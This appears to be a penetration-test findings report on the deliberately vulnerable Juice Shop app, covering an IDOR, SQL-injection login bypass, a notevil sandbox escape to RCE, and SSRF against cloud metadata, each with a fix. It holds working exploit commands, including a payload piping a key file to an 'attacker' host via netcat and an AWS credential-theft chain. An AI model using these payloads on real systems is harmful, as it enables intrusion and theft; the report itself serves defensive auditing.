# yieldOS Reality Check — findings list

## 1. IDOR in /rest/basket/:id allows any authenticated user to read any other user's basket

- round: 1  ·  strategy: `owasp-a01-broken-access-control`
- severity: **HIGH**
- file: `routes/basket.ts`  ·  retrieveBasket() lines 15-36; basket lookup `BasketModel.findOne({ where: { id }, ... })` at line 19 uses the URL `:id` directly with no comparison against the authenticated user's `bid` (the JWT-bound basket id). Wired in server.ts:601 `app.get('/rest/basket/:id', retrieveBasket())` behind only `security.isAuthorized()` (server.ts:398-399) which is just `expressJwt({ secret: publicKey })` (lib/insecurity.ts:54) — JWT validity check, no ownership check.

**attack vector:**

> 1) Attacker registers/logs in as a normal user via POST /rest/user/login and obtains a valid JWT. 2) Attacker observes their own basket id is e.g. 6 from /rest/user/whoami or by inspecting the JWT payload's `bid`. 3) Attacker iterates or guesses other basket ids (small auto-increment integers, typically 1..N matching user count) and issues GET /rest/basket/<victim_bid> with their own Bearer token. 4) The handler skips any check that the requesting user owns basket id `<victim_bid>` — `findOne({ where: { id } })` returns the victim's basket including all `Products`, quantities, and prices. The presence of `challengeUtils.solveIf(challenges.basketAccessChallenge, () => user?.bid != parseInt(id, 10))` confirms the developers know this comparison should have *blocked* the request, but it is only used to score a challenge instead of to deny access. This is horizontal privilege escalation against every customer's shopping basket and order pipeline (the same id flows into POST /rest/basket/:id/checkout and PUT /rest/basket/:id/coupon/:coupon, server.ts:602-603, with the same gap).

**exploit evidence:**

```
# Step 1 – log in as our own low-priv account
TOKEN=$(curl -s http://localhost:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@juice-sh.op","password":"attacker"}' \
  | jq -r '.authentication.token')

# Step 2 – read victim basket id 1 (admin) using OUR token
curl -s http://localhost:3000/rest/basket/1 \
  -H "Authorization: Bearer ${TOKEN}" \
  -H 'Cookie: token='"${TOKEN}"
# => { "status":"success","data":{"id":1,"coupon":null,"UserId":1,
#       "Products":[ {"id":1,"name":"Apple Juice (1000ml)","price":1.99, ...}, ... ] } }

# Step 3 – sweep all baskets
for i in $(seq 1 50); do
  curl -s -H "Authorization: Bearer ${TOKEN}" \
       http://localhost:3000/rest/basket/$i | jq -c '{id:.data.id,UserId:.data.UserId,items:(.data.Products|length)}'
done
# Each request returns the target basket regardless of who owns it.
```

**fix recommendation:**

> Enforce ownership inside retrieveBasket() (and the sibling checkout/coupon handlers) before returning the resource. Concretely: derive the caller's basket id from the validated JWT (`security.authenticatedUsers.from(req)?.bid` or the user's `UserId` -> `BasketModel.findOne({ where: { UserId } })`) and compare against `req.params.id`; respond 403 if they differ. Example:
> 
>   const user = security.authenticatedUsers.from(req)
>   if (!user || String(user.bid) !== String(req.params.id)) {
>     return res.status(403).json({ error: 'Forbidden' })
>   }
> 
> Apply the same guard to `app.post('/rest/basket/:id/checkout', ...)` (routes/order.ts) and `app.put('/rest/basket/:id/coupon/:coupon', ...)` (routes/coupon.ts), and remove the use of the ownership predicate as a mere *challenge-solved* signal in challengeUtils.solveIf — it must be an enforcement gate, not telemetry. As a defense-in-depth measure, also stop trusting `:id` as an integer and add a generic authorization middleware that resolves any `:id` route parameter to the requester's owned resource.

---

## 2. SQL injection authentication bypass in /rest/user/login via string-concatenated email/password into raw SELECT

- round: 2  ·  strategy: `owasp-a03-injection`
- severity: **CRITICAL**
- file: `routes/login.ts`  ·  line 34 — models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })

**attack vector:**

> 1) The login handler in routes/login.ts (login()) receives req.body.email and req.body.password from an unauthenticated POST /rest/user/login. 2) The email field is interpolated DIRECTLY into a raw SQL string with no parameterization, no escaping, and no input validation — only the password is hashed before being concatenated. The query is sent through models.sequelize.query(...) which executes it verbatim against the SQLite backend. 3) An attacker submits a crafted email value that closes the single-quote string literal and appends an injected predicate. Because sequelize.query is configured with `{ plain: true }`, the FIRST row returned is treated as the authenticated user. With 'ORDER BY id' implicit / natural row order, the admin row (id=1) is returned. 4) afterLogin() then issues a fully-privileged JWT for that user via security.authorize(user) and stores it in security.authenticatedUsers — the attacker is now authenticated as admin@juice-sh.op without ever supplying a password. 5) From there the attacker pivots: GET /api/Users (admin route), DELETE /api/Users/:id, manipulate orders/baskets/feedbacks, and access the /administration UI gated by the admin role. The same primitive can also be used to dump the Users table via UNION (the 8-column shape is already documented in routes/search.ts and the exposed challenge metadata), exfiltrating bcrypt-style password hashes, TOTP secrets, and the admin user record. Note also that the password field is hashed BEFORE concatenation, so a second-order injection in the email alone bypasses any need to know any password.

**exploit evidence:**

```
curl -k -X POST https://target/rest/user/login -H 'Content-Type: application/json' -d '{"email":"\' OR 1=1--","password":"x"}'

Resulting backend SQL (with `{ plain: true }` returning the first row, which is the admin row):
  SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '<hash of x>' AND deletedAt IS NULL

Response body:
  {"authentication":{"token":"eyJhbGciOi...","bid":1,"umail":"admin@juice-sh.op"}}

The returned `token` is a valid admin JWT. Use it as `Authorization: Bearer <token>` against /api/Users, /api/Feedbacks, etc.

Alternative targeted login as a specific user (e.g. jim):
  {"email":"jim@juice-sh.op'--","password":"x"}  →  SELECT * FROM Users WHERE email = 'jim@juice-sh.op'--' AND password = '...' AND deletedAt IS NULL

Alternative UNION-based credential dump via the same primitive (and identical pattern in routes/search.ts line 23):
  GET /rest/products/search?q=')) UNION SELECT id,email,password,'4','5','6','7','8' FROM Users--
```

**fix recommendation:**

> Replace the raw template-string query in routes/login.ts:34 with a parameterized Sequelize Model call. Concretely: `UserModel.findOne({ where: { email: req.body.email, password: security.hash(req.body.password || ''), deletedAt: null } })` — Sequelize will bind the values as parameters, so quotes/comments/UNION become inert literal strings. As a defense in depth: (a) coerce `req.body.email` to string and length-cap it; (b) reject emails that don't match a basic email regex BEFORE the DB call; (c) audit and convert every other `models.sequelize.query(\`...${userInput}...\`)` site (notably routes/search.ts:23 which has the same pattern in `searchProducts`) to use bind parameters via `replacements`/`bind`; (d) add a CI rule (eslint-plugin-security/detect-non-literal-fs-filename style, or a custom AST check) that fails the build on any sequelize.query() whose argument is a TemplateLiteral containing an Identifier/MemberExpression — i.e. any string-concatenated SQL.

---

## 3. Deserialization/eval of untrusted JS body in /b2b/v2/orders via notevil + vm sandbox (RCE / sandbox escape)

- round: 4  ·  strategy: `owasp-a08-software-integrity`
- severity: **CRITICAL**
- file: `routes/b2bOrder.ts`  ·  b2bOrder() handler, lines 16-34 — vm.createContext + vm.runInContext('safeEval(orderLinesData)') with notevil's eval; route bound at server.ts:645 ('app.post("/b2b/v2/orders", b2bOrder())') behind only security.isAuthorized() (server.ts:423)

**attack vector:**

> Step 1: register a normal user (POST /api/Users) and log in (POST /rest/user/login) to obtain a JWT — security.isAuthorized() at server.ts:423 only checks authentication, no role/B2B-account check. Step 2: send POST /b2b/v2/orders with header `Authorization: Bearer <jwt>` and JSON body `{"orderLinesData":"<arbitrary JS source as a string>"}`. Step 3: the handler at routes/b2bOrder.ts:19-23 takes `body.orderLinesData` verbatim — no type check, no length cap, no schema validation — and feeds it as the source string to `safeEval` (which is notevil's eval) running inside `vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })`. notevil is meant to be a 'safe' AST-walking evaluator, but it has well-known sandbox escapes (e.g. via prototype-chain access on objects/functions returned to the caller, accessing the `constructor` of Function/Array/Object, and via thrown/caught exceptions whose objects expose host-realm functions). Once the attacker reaches a host-realm function reference inside the sandbox, they can call `constructor.constructor('return process')()` (or equivalent) to escape into the Node process and `require('child_process').execSync(...)` — i.e. full RCE as the juice-shop server user, with read access to ctf.key, encryptionkeys/, and the SQLite DB containing all bcrypt hashes and TOTP secrets. Step 4 (DoS fallback even if the sandbox fully holds): submit any tight infinite loop (`while(1){}` / `for(;;);`) — the 2000 ms vm timeout fires per request, but the work is synchronous on the Node main thread, so a few concurrent requests pin the event loop at ~100% and stall every other endpoint (rceOccupyChallenge confirms the developers know this). The control flow at b2bOrder.ts:31 even rewards an 'Infinite loop detected - reached max iterations' error from notevil by `solveIf(rceChallenge, ...)`, telling the attacker exactly when their payload reached the eval sink.

**exploit evidence:**

```
# 1. Register + login to get JWT (omitted — standard /api/Users + /rest/user/login)

# 2. Drive notevil into infinite-loop detection (proves payload is being eval'd) — Juice Shop's own 'Successful RCE' marker:
curl -k -X POST https://target/b2b/v2/orders \
  -H 'Authorization: Bearer <jwt>' \
  -H 'Content-Type: application/json' \
  --data '{"cid":"x","orderLinesData":"for(let i=0;i<9999999;i++){i}"}'
# -> server returns 500 with 'Infinite loop detected - reached max iterations'  (rceChallenge solved == sink reached)

# 3. CPU/event-loop DoS (rceOccupyChallenge):
curl ... --data '{"cid":"x","orderLinesData":"while(true){}"}'
# -> 503 'Sorry, we are temporarily not available!' — and during the 2s window every other request blocks.

# 4. Sandbox-escape RCE attempt (notevil prototype-chain pivot — concept, exact gadget varies by notevil minor version, ^1.3.3 is in package.json:167):
curl ... --data '{"cid":"x","orderLinesData":"(function(){try{({}).__proto__.constructor.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"cat /tmp/yos-bench/targets/juice-shop/ctf.key | nc attacker 4444\")}catch(e){return e.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"id\").toString()}})()"}'
# Any one of the prototype-chain pivots that survives notevil's AST filter yields shell as the juice-shop process owner.
```

**fix recommendation:**

> Do not feed request bodies to any eval-style primitive. Specifically: (1) Delete the vm/notevil branch in routes/b2bOrder.ts entirely — replace it with a strict JSON.parse + Joi/zod schema validation of orderLinesData (expected shape: array of {productId:number, quantity:number}), and reject anything that is not a plain JSON document. (2) Remove the `notevil` dependency from package.json so it cannot be reintroduced. (3) If a sandbox is unavoidable, run it in a separate process with `child_process.fork` + a hard CPU/time budget enforced by the OS (ulimit / cgroups), never on the request thread, and never with a string sourced from req.body. (4) Add an authorization layer on /b2b/v2/* that requires a B2B-role claim, not just any logged-in user. (5) Cap body size for /b2b/v2/orders to a few KB via a route-scoped `express.json({ limit: '4kb' })` so unbounded payloads cannot be smuggled into the parser even before validation. (6) Remove the challengeUtils.solveIf success signals from the error path so a future attacker has no oracle telling them they reached the eval sink.

---

## 4. Unrestricted SSRF in /profile/image/url — fetch() of attacker-controlled URL with response body written to a publicly served path (cloud metadata theft / internal service probe)

- round: 5  ·  strategy: `owasp-a10-ssrf`
- severity: **HIGH**
- file: `routes/profileImageUrlUpload.ts`  ·  profileImageUrlUpload(), line 19-32 — `const url = req.body.imageUrl` flows unvalidated into `await fetch(url)` at line 24, and the response stream is then piped to `frontend/dist/frontend/assets/public/images/uploads/${loggedInUser.data.id}.${ext}` (line 29-30), which is served back by Express at /assets/public/images/uploads/<id>.<ext>. Wired up at server.ts:311 `app.post('/profile/image/url', uploadToMemory.single('file'), profileImageUrlUpload())`.

**attack vector:**

> 1) Attacker registers any account (POST /api/Users) and logs in (POST /rest/user/login) to get a JWT/cookie token. The route is gated only by `security.authenticatedUsers.get(req.cookies.token)` at line 21 — any authenticated user passes. 2) Attacker sends POST /profile/image/url with body `{"imageUrl":"<attacker-chosen URL>"}`. The handler takes `req.body.imageUrl` verbatim — no scheme allowlist, no host allowlist, no DNS rebinding protection, no IP-range filter, no Content-Length cap, no Content-Type check, and Node's native `fetch` (undici) defaults to `redirect: 'follow'`. 3) The handler issues `fetch(url)` directly from the server. This lets the attacker pivot the juice-shop server into an internal/loopback HTTP client. Concrete pivots: (a) Cloud metadata theft on AWS/GCP/Azure — point at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/` (AWS IMDSv1) or `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (the Google header check is the only thing missing here, but other GCP metadata paths still leak); (b) Internal service probe — `http://localhost:3000/api/Users`, `http://10.0.0.x:6379`, internal admin panels, Kubernetes API at `https://kubernetes.default.svc`, etcd, Consul, Redis HTTP fronts; (c) DNS-rebinding / open-redirect chain — host an attacker-controlled server that 302-redirects to an internal target; native fetch follows redirects by default. 4) Crucially, the *response body* is not just consumed — line 29-30 writes it via `Readable.fromWeb(response.body).pipe(fileStream)` to `frontend/dist/frontend/assets/public/images/uploads/<attackerUserId>.<ext>`, which Express serves under `/assets/public/images/uploads/`. The user's profileImage is also updated to that path (line 32). So after a single request, the attacker simply does `GET /assets/public/images/uploads/<theirId>.jpg` and downloads the *raw bytes the internal target returned* — full read-SSRF, not blind. The extension whitelist at line 28 only changes the filename suffix; it does not affect the URL fetched or the content written. 5) Bonus secondary impact: if `fetch` throws (target unreachable, non-OK, scheme not supported by undici such as `file://`/`gopher://`), the catch at line 33-37 stores the URL string directly into the DB column `profileImage` and renders it as the user's avatar `<img src=...>` — giving a stored `javascript:`-URI / data-URI injection primitive (separate XSS finding, but powered by the same lack of input validation).

**exploit evidence:**

```
# 1) register + login
curl -k -s -X POST https://target/api/Users -H 'Content-Type: application/json' \
  -d '{"email":"ssrf@x.test","password":"Aa1!aaaa","passwordRepeat":"Aa1!aaaa","securityQuestion":{"id":1},"securityAnswer":"x"}'
TOKEN=$(curl -k -s -X POST https://target/rest/user/login -H 'Content-Type: application/json' \
  -d '{"email":"ssrf@x.test","password":"Aa1!aaaa"}' | jq -r .authentication.token)
UID=$(curl -k -s https://target/rest/user/whoami -H "Authorization: Bearer $TOKEN" -H "Cookie: token=$TOKEN" | jq -r .user.id)

# 2) Trigger SSRF — fetch AWS IMDSv1 metadata via the server
curl -k -s -X POST https://target/profile/image/url \
  -H "Cookie: token=$TOKEN" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# 3) Exfiltrate the response body — it was written to a public asset path
curl -k -s https://target/assets/public/images/uploads/${UID}.jpg
# -> prints the role name(s) leaked from IMDS

# 4) Second hop — grab the temporary creds for that role
curl -k -s -X POST https://target/profile/image/url \
  -H "Cookie: token=$TOKEN" -H 'Content-Type: application/json' \
  -d '{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-from-step-3>"}'
curl -k -s https://target/assets/public/images/uploads/${UID}.jpg
# -> JSON containing AccessKeyId / SecretAccessKey / Token — full AWS pivot

# Variant: probe internal Redis / admin via loopback
curl -k -s -X POST https://target/profile/image/url \
  -H "Cookie: token=$TOKEN" -H 'Content-Type: application/json' \
  -d '{"imageUrl":"http://127.0.0.1:8080/admin/secrets"}'
curl -k -s https://target/assets/public/images/uploads/${UID}.jpg
```

**fix recommendation:**

> Treat `req.body.imageUrl` as fully untrusted and validate before fetching. Concrete patch in routes/profileImageUrlUpload.ts: (1) Parse with `new URL(url)` inside try/catch and reject anything where `protocol` is not exactly `http:` or `https:` (this also blocks `file:`, `data:`, `gopher:`, `javascript:`, `ftp:`). (2) Resolve the hostname with `dns.lookup(host, { all: true })` and reject the request if ANY resolved address is in a private/reserved/loopback/link-local range — 0.0.0.0/8, 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8, 169.254.0.0/16 (covers AWS/GCP/Azure metadata 169.254.169.254), 172.16.0.0/12, 192.0.0.0/24, 192.168.0.0/16, 198.18.0.0/15, ::1/128, fc00::/7, fe80::/10, fd00::/8, ::ffff:0:0/96 (IPv4-mapped). Use a vetted library such as `ipaddr.js` / `is-private-ip` rather than hand-rolled regex. (3) Pass the *resolved IP* to fetch (or use a custom undici Agent with a connect hook) and set the Host header explicitly, so DNS rebinding cannot swap the target between check and connect. (4) Disable redirects (`fetch(url, { redirect: 'manual' })`) and refuse non-2xx responses; if redirects must be followed, re-run the same scheme/IP check on every Location. (5) Cap response size (e.g. abort after 2 MB) and require a Content-Type matching `image/*`. (6) Remove the catch-branch fallback that stores the raw URL string into `profileImage` (line 36) — it lets attackers persist `javascript:` / data: / non-http URIs in the avatar `<img src>`. Optionally constrain to a small allowlist of avatar host providers (gravatar.com, githubusercontent.com) which is the cleanest version of the fix.

---
